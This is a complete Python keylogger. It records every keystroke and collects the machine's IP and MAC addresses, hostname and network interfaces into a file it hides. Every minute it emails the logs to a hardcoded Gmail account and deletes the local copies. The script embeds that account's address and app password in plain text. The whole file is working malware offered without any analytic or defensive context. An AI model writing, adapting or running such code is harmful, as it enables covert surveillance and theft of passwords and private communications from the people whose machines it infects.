from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
from datetime import datetime
from pynput.keyboard import Listener
from requests import get
import time
import os
import psutil
import uuid
import re
from threading import Timer

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
file_path = os.path.abspath(os.getcwd())
extend = "\\"
count = 0
keys = []
email_address = "k3yl00g3r444@gmail.com"
toaddr = "k3yl00g3r444@gmail.com"
password = "amlfuahzumbkooxi"


def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = str(time.ctime(time.time()))
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        full_path = file_path + extend + system_information
        os.system(f'attrib +h {full_path}')
        f.write(f"Time:{current_time()}\n\n")
        try:
            publicIP = get("https://api.ipify.org").text
            f.write(f"""        Public IP Address {publicIP}""")
        except Exception:
            f.write("Couldn't get Public IP Address")
        f.write(f"""
        Private IP Address: {socket.gethostbyname(socket.gethostname())}
        Mac-Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}\n""")

        f.write(f"""
        CPU: {platform.processor()}
        System: {platform.system()} {platform.version()}
        Machine: {platform.machine()}
        Hostname: {socket.gethostname()}
        """)

        f.write("----------------INTERFACE ADDRESS--------------------\n")
        if_addrs = psutil.net_if_addrs()
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                f.write((f"=== Interface: {interface_name} ===\n"))
                if str(address.family) == 'AddressFamily.AF_INET':
                    f.write((f"""  
                    IP Address: {address.address}
                    Netmask: {address.netmask}
                    Broadcast IP: {address.broadcast}\n\n"""))
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    f.write((f"""  
                    MAC Address: {address.address}
                    Netmask: {address.netmask}
                    Broadcast MAC: {address.broadcast}\n\n"""))
        f.write("------------------------------------\n")


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 1:
        write_file(keys)
        count = 0
        keys = []


def write_file(keys):

    substitution = ['Key.enter', '[ENTER]\n',
                    'Key.backspace', '[BACKSPACE]',
                    'Key.space', ' ',
                    'Key.alt_l', '[ALT]',
                    'Key.tab', '[TAB]',
                    'Key.delete', '[DEL]',
                    'Key.ctrl_l', '[CTRL]',
                    'Key.left', '[LEFT ARROW]',
                    'Key.right', '[RIGHT ARROW]',
                    'Key.shift', '[SHIFT]',
                    '\\x13', '[CTRL-S]',
                    '\\x17', '[CTRL-W]',
                    'Key.caps_lock', '[CAPS LK]',
                    '\\x01', '[CTRL-A]',
                    'Key.cmd', '[WINDOWS KEY]',
                    'Key.print_screen', '[PRNT SCR]',
                    '\\x03', '[CTRL-C]',
                    '\\x16', '[CTRL-V]']

    with open(file_path + extend + keys_information, "a") as f:
        for ind, key in enumerate(keys):
            if str(key) in substitution:
                key = substitution[substitution.index(str(keys[ind]))+1]
                f.write(key)
            else:
                f.write(str(key).replace("'", ""))


def delete_keys_information():
    try:
        os.remove(os.path.abspath(os.getcwd()) + '\\' + keys_information)
    except:
        pass


def delete_system_inforamtion():
    try:
        os.remove(os.path.abspath(os.getcwd()) + '\\' + system_information)
    except:
        pass


def current_time():
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    return dt_string


def schedule():
    timer = Timer(interval=60, function=schedule)
    timer.daemon = True
    timer.start()
    send_email(keys_information, file_path + extend + keys_information, toaddr)
    delete_keys_information()


def main():

    try:
        computer_information()
    except:
        pass
    send_email(system_information, file_path +
               extend + system_information, toaddr)
    delete_system_inforamtion()

    with open(file_path + extend + keys_information, "w") as f:
        f.write(f"Start {current_time()}")
    schedule()
    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == '__main__':
    main()
